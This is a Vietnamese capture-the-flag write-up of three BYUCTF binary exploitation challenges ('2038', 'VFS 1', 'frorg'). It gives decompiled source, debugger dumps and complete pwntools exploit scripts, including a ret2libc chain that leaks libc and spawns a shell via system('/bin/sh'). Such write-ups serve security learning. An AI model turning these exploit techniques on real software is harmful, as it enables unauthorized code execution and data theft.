# 2038

## Source code

<details> <summary> Source code </summary>

```c
int print_flag()
{
  char v1; // [rsp+7h] [rbp-9h]
  FILE *stream; // [rsp+8h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Could not find flag.txt");
  while ( 1 )
  {
    v1 = getc(stream);
    if ( v1 == -1 )
      break;
    putchar(v1);
  }
  return putchar(10);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v4; // rax
  char *v5; // rax
  int v6; // [rsp+4h] [rbp-2Ch]
  time_t timer; // [rsp+8h] [rbp-28h] BYREF
  time_t v8; // [rsp+10h] [rbp-20h] BYREF
  char nptr[12]; // [rsp+1Ch] [rbp-14h] BYREF
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("Task: 'print_flag'");
  puts("Description: 'prints out the flag'");
  puts("Date: 'undefined'\n");
  puts("ERROR - date for 'print_flag' task is not defined");
  puts("This task is not available until January 1st, 2024\n");
  puts("You may optionally extend this task to be available later");
  puts(
    "To specify when you would like to make the task available, specify the number of seconds since January 1st, 1970 UTC");
  printf("> ");
  __isoc99_scanf("%10s", nptr);
  v6 = atoi(nptr);
  if ( (unsigned int)v6 > 0x6592007F )
  {
    timer = v6;
    v4 = ctime(&timer);
    printf("\nSpecified datetime - %s\n", v4);
    v8 = time(0LL);
    v5 = ctime(&v8);
    printf("Current datetime - %s\n", v5);
    if ( timer >= v8 )
    {
      puts("'print_flag' was not run because specified date has not occurred yet. Exiting...");
    }
    else
    {
      puts("Time requirement has been met. Running 'print_flag'...");
      print_flag();
    }
    return 0;
  }
  else
  {
    puts("\nERROR - date must be after January 1st, 2024");
    return 1;
  }
}
```

</details>

## Ý tưởng

- Đây là bài time UNIX, đầu vào cho ta nhập vào 1 chuỗi và đổi chuỗi đó sang số thông qua hàm atoi()

```c
  __isoc99_scanf("%10s", nptr);
  v6 = atoi(nptr);
```

- Nói chung chỉ cần thoả các điều kiện thì nó sẽ in ra flag, chú ý đề bài `2038`, nên ta sẽ dùng các trang web `UNIX time converter` để convert sang số.

## Khai thác

- Do đề bài hint cho ta năm 2038, nên ta sẽ convert năm 2038 còn ngày tháng bao nhiêu cũng được

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/7827f48b-6773-43bf-b497-5f75b5e0c336)

# VFS 1

## Source code

<details> <summary> source code </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

__attribute__((constructor)) void flush_buf() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void banner() {
    puts("VVVVVVVV           VVVVVVVVFFFFFFFFFFFFFFFFFFFFFF   SSSSSSSSSSSSSSS ");
    puts("V::::::V           V::::::VF::::::::::::::::::::F SS:::::::::::::::S");
    puts("V::::::V           V::::::VF::::::::::::::::::::FS:::::SSSSSS::::::S");
    puts("V::::::V           V::::::VFF::::::FFFFFFFFF::::FS:::::S     SSSSSSS");
    puts(" V:::::V           V:::::V   F:::::F       FFFFFFS:::::S            ");
    puts("  V:::::V         V:::::V    F:::::F             S:::::S            ");
    puts("   V:::::V       V:::::V     F::::::FFFFFFFFFF    S::::SSSS         ");
    puts("    V:::::V     V:::::V      F:::::::::::::::F     SS::::::SSSSS    ");
    puts("     V:::::V   V:::::V       F:::::::::::::::F       SSS::::::::SS  ");
    puts("      V:::::V V:::::V        F::::::FFFFFFFFFF          SSSSSS::::S ");
    puts("       V:::::V:::::V         F:::::F                         S:::::S");
    puts("        V:::::::::V          F:::::F                         S:::::S");
    puts("         V:::::::V         FF:::::::FF           SSSSSSS     S:::::S");
    puts("          V:::::V          F::::::::FF           S::::::SSSSSS:::::S");
    puts("           V:::V           F::::::::FF           S:::::::::::::::SS ");
    puts("            VVV            FFFFFFFFFFF            SSSSSSSSSSSSSSS   ");
    puts("");
    puts("");
    puts("[+] Welcome to the Virtual File System! Here you can create, delete, and");
    puts("modify files. In order to save space, multiple people are using this same");
    puts("system. But don't worry! We've implemented a system to prevent people from");
    puts("seeing each other's files. Enjoy!\n\n");
}

int menu() {
    int choice;

    puts("[+] What would you like to do?");
    puts("1. Create a file");
    puts("2. Delete a file");
    puts("3. Modify a file");
    puts("4. Read a file");
    puts("5. Exit");

    printf("> ");
    scanf("%d", &choice);

    return choice;
}

int main() {
    banner();

    // INITIALIZATIONS
    struct filesystem {
        char contents[2880];
        char flag[64];
        int current_file;
    };

    // get flag
    struct filesystem fs;
    char * buffer = 0;
    long length;
    FILE * f = fopen ("flag.txt", "rb");

    if (f) {
        fseek (f, 0, SEEK_END);
        length = ftell (f);
        fseek (f, 0, SEEK_SET);
        buffer = malloc (length);
        if (buffer) {
            fread (buffer, 1, length, f);
        }
        fclose (f);
    }

    if (buffer) {
        strcpy(fs.flag, buffer);
        free(buffer);
    }
    else {
        puts("[-] Error reading flag");
        exit(1);
    }

    fs.current_file = 0;
    char filename[32];
    char contents[256];

    while (1==1) {
        int choice = menu();

        if (choice == 1) {

            if (fs.current_file == 10) {
                puts("[-] Sorry, you can't create any more files!");
                continue;
            }
            // create


            puts("[+] What would you like to name your file?");
            printf("> ");
            scanf("%32s", filename);

            puts("[+] What would you like to put in your file?");
            printf("> ");
            scanf("%256s", contents);

            // copy filename
            memcpy(fs.contents + (fs.current_file*288), filename, 32);

            // copy contents
            memcpy(fs.contents + (fs.current_file*288) + 32, contents, 256);

            printf("[+] File created! (#%d)\n\n", fs.current_file);
            fs.current_file++;
        }
        else if (choice == 2) {
            // delete
            //delete_file();
            printf("Sorry, that hasn't been implemented yet!\n");
        }
        else if (choice == 3) {
            // modify
            //modify_file();
            printf("Sorry, that hasn't been implemented yet!\n");
        }
        else if (choice == 4) {
            // read
            int file_to_read;

            puts("[+] Which file # would you like to read?");
            printf("> ");
            scanf("%d", &file_to_read);

            if ((file_to_read >= fs.current_file) || (file_to_read < 0)) {
                puts("[-] Invalid file number");
                continue;
            }

            printf("[+] Filename: %s", fs.contents + (file_to_read*288));
            printf("[+] Contents: %s", fs.contents + (file_to_read*288) + 32);
        }
        else if (choice == 5) {
            exit(0);
        }
        else {
            puts("[-] Invalid choice");
            exit(1);
        }
    }
}
```

</details>

## Ý tưởng

- Đọc code khá lú, đại loại sẽ tạo (option 1) và đọc (option 4), khi ta debug ta thấy, flag sẽ được đọc và ghi vào heap như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/2e3efb15-8bcc-4d2c-a4b3-efeadfbf0557)
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/d35dbc07-2601-483d-8e99-87fc9862fe6a)
- Ta debug đến strcpy thì thấy nó như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/e9d2c2ed-c87c-4be3-b537-9ed73056eab4)

```c
strcpy@plt (
   $rdi = 0x007fffffffdab0 → 0x0000000000000000,
   $rsi = 0x00555555559690 → "this-is-fake-flag\n",
   $rdx = 0x007fffffffdab0 → 0x0000000000000000
)
```

- Nghĩa là nó lấy flag bỏ vào địa chỉ 0x007fffffffdab0, lưu trong stack

- Flag của chúng ở đây

`0x007fff9417f090│+0x0b60: "this-is-fake-flag\n"
0x007fff9417f098│+0x0b68: "fake-flag\n"`

- Chuỗi chúng ta nhập ở đây

```
0x007fff9417e550│+0x0020: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa111111111111111111[...]"
0x007fff9417e558│+0x0028: "aaaaaaaaaaaaaaaaaaaaaaaa11111111111111111111111111[...]"
0x007fff9417e560│+0x0030: "aaaaaaaaaaaaaaaa1111111111111111111111111111111111[...]"
0x007fff9417e568│+0x0038: "aaaaaaaa111111111111111111111111111111111111111111[...]"
0x007fff9417e570│+0x0040: "11111111111111111111111111111111111111111111111111[...]"
0x007fff9417e578
```

-Nghĩa là nếu chúng ta có thể nối chuỗi ở `0x007fff9417e550` với flag thành 1 chuỗi không có null byte thì %s nó sẽ in ra hết và kèm flag của ta vào

## Thực thi

- Do ta chỉ được nhập 10 lần và chỉ cần 10 lần đó có thể tạo được một chuỗi dài không có null byte
- Chương trình cho ta nhập 32 byte tên và 256 byte nội dung nên ta vẫn nhập đủ 32 và 256 byte đó

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('vfs1', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+355

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('byuctf.xyz', 40008)
else:
    p = process(exe.path)

GDB()


def option1():
    sla(b"> ", b"1")
    sla(b"> ", b"a"*32)
    sla(b"> ", b"1"*256)


for i in range(10):
    option1()
p.interactive()
```

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/60173762-3c4d-4bbf-a479-4962440b291d)

# frorg

## Source

<details> <summary> Source </summary>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4[12]; // [rsp+Ch] [rbp-34h] BYREF
  int i; // [rsp+3Ch] [rbp-4h]

  puts("I love frorggies so much! So much I made this application to store all the frorgie names you want");
  puts("How many frorgies you want to store? ");
  __isoc99_scanf("%d", v4);
  for ( i = 0; i < v4[0]; ++i )
  {
    puts("Enter frorgy name: ");
    read(0, (char *)&v4[1] + 10 * i, 0xAuLL);
  }
  puts("Thank you!");
  return 0;
}
```

</details>

## Ý tưởng

- Ta chú ý dòng này `read(0, (char *)&v4[1] + 10 * i, 0xAuLL);`, đại loại nó sẽ read vào địa chỉ `v4 + 10 * i` vậy các địa chỉ nà sẽ liên tụ với nhau

```
0x007ffe213b4b28│+0x0008: 0x0000000900000000
0x007ffe213b4b30│+0x0010: "aaaaaaaaaa"   ← $rsi
0x007ffe213b4b38│+0x0018: 0x00000000006161 ("aa"?)
```

- Ta debug thử thì đúng như lí thuyết, 10 byte tiếp theo sẽ là

```
0x007ffe213b4b28│+0x0008: 0x0000000900000000
0x007ffe213b4b30│+0x0010: "aaaaaaaaaa"   ← $rsi
0x007ffe213b4b38│+0x0018: 0x62626262626161 ("aa"?)
0x007ffe213b4b40│+0x0020: 0x0000000062626262
```

- Vậy nó sẽ là ret2libc, chỉ là cực hơn thôi
- Chú ý chỗ này

```
0x007ffe213b4b50│+0x0030: 0x0000000000000000
0x007ffe213b4b58│+0x0038: 0x00000002d0090ad0
0x007ffe213b4b60│+0x0040: 0x0000000000000001     ← $rbp
```

- số 2 trong này sử dụng để biểu diễn số vòng lặp, nên khi ghi đè nó thì phải trả lại cho nó giá trị đúng, ở câu lệnh này `0x401275 <main+139>       cmp    DWORD PTR [rbp-0x4], eax`

## Khai thác

### offset

```python
sla(b"store? \n", b"9")
for i in range(4):
    sa(b"name: \n", b"a" * 10)
payload = p64(0x0461616161) + b"aa"
sa(b"name: \n", payload)
```

- `0x0461616161` như nó ở trên nếu ghi đè giá trị vòng lặp nó sẽ lặp không đúng, nên ta sẽ phải có byte `0x4` để trả lại giá trị cho nó
- Trước lúc ghi đè

```
0x007ffe213b4b50│+0x0030: 0x6161616161616161
0x007ffe213b4b58│+0x0038: 0x00000003d0090ad0
0x007ffe213b4b60│+0x0040: 0x0000000000000001     ← $rbp
```

- Sau khi ghi đè

```
0x007ffd08da7f90│+0x0030: 0x6161616161616161
0x007ffd08da7f98│+0x0038: 0x0000000561616161
0x007ffd08da7fa0│+0x0040: 0x00000000006161 ("aa"?)       ← $rbp
```

### overwrite rip

```python
sa(b"name: \n", b"\0" * 6 + p32(0x4011e5))
```

- `0x4011e5` là giá trị củ pop rdi, ban đầu tính nhảy vào hàm pop rdi nhưng lằng nhằng quá nên ra lấy gadget, ta ghi đè được như này

```
0x007ffd08da7fa0│+0x0040: 0x00000000006161 ("aa"?)       ← $rbp
0x007ffd08da7fa8│+0x0048: 0x00007fb3004011e5
```

```python
sa(b"name: \n", b"\0" * 4 + p32(0x404000) + b"\0\0")
```

- 4 byte null này để ghi đè cả địa chỉ này thành `0x007ffd08da7fa8| : 0x000000004011e5`
- Vậy chúng ta đã hiểu cách hoạt động rồi nên chỉ wu đến đây thoi =)), các lần sau cũng tương tự như vậy thôi, có thể dùng one_gadget hoặc system chắc là đều được

## Chú ý

- Chỗ này tại sao phải tách ra 2 part thì do 4 byte null nó ở trên, nên mới phải tách binsh ra 4byte và 2byte và gửi vào chứ không được `b"\0" * 4 + p64(binsh)` vì nó đã 12byte rồi

```python
binsh = next(libc.search(b'/bin/sh'))
part1 = (binsh & 0xffff)
part2 = binsh >> 16

sa(b"name: \n", b"\0" * 4 + p16(part1) + p32(part2))
```

## Kết quả

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('frorg_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*main+159
                b*main+132
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('byuctf.xyz', 40015)
else:
    p = process(exe.path)

GDB()

sla(b"store? \n", b"9")
for i in range(4):
    sa(b"name: \n", b"a" * 10)
payload = p64(0x0461616161) + b"aa"
sa(b"name: \n", payload)
sa(b"name: \n", b"\0" * 6 + p32(0x4011e5))

sa(b"name: \n", b"\0" * 4 + p32(0x404000) + b"\0\0")
sa(b"name: \n", b"\0" * 2 + p64(exe.plt['puts']))

sa(b"name: \n", p64(0x4011ea))
p.recvuntil(b"Thank you!\n")
libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("leak libc: " + hex(libc_leak))
libc.address = libc_leak - 510432
info("base libc: " + hex(libc.address))

sla(b"store? \n", b"9")
for i in range(4):
    sa(b"name: \n", b"a" * 10)
payload = p64(0x0461616161) + b"\0\0"
sa(b"name: \n", payload)
sa(b"name: \n", b"\0" * 6 + p32(0x4011e5))
binsh = next(libc.search(b'/bin/sh'))
part1 = (binsh & 0xffff)
part2 = binsh >> 16

sa(b"name: \n", b"\0" * 4 + p16(part1) + p32(part2))
sa(b"name: \n", b"\0\0" + p64(0x000000000040101a))
sa(b"name: \n", p64(libc.sym['system']))
p.interactive()
```
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/b356af70-d60b-4109-9498-e9ec25782c60)
